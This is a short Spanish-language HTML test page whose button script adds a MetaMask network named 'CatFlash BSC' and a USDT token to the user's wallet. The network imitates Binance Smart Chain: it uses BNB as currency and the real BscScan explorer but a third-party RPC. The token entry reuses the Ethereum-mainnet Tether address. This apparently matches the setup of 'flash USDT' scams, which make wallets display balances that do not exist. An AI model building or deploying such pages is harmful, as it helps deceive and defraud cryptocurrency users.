<!DOCTYPE html>
<html lang="es">
<head><meta charset="UTF-8" /><title>Test MetaMask</title></head>
<body>
<button id="connectBtn">Conectar MetaMask</button>
<script>
const connectBtn = document.getElementById('connectBtn');
connectBtn.onclick = async () => {
  if (!window.ethereum) return alert('Instala MetaMask');
  try {
    await ethereum.request({ method: 'eth_requestAccounts' });
    await ethereum.request({
      method: 'wallet_addEthereumChain',
      params: [{
        chainId: '0x53c',
        chainName: 'CatFlash BSC',
        rpcUrls: ['https://dataseed-binance.catflash.cat/'],
        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
        blockExplorerUrls: ['https://bscscan.com']
      }]
    });
    await ethereum.request({
      method: 'wallet_watchAsset',
      params: {
        type: 'ERC20',
        options: {
          address: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
          symbol: 'USDT',
          decimals: 6,
          image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
        }
      }
    });
    alert('Red y token a√±adidos, revisa MetaMask.');
  } catch(e) {
    alert('Error: ' + e.message);
    console.error(e);
  }
};
</script>
</body>
</html>
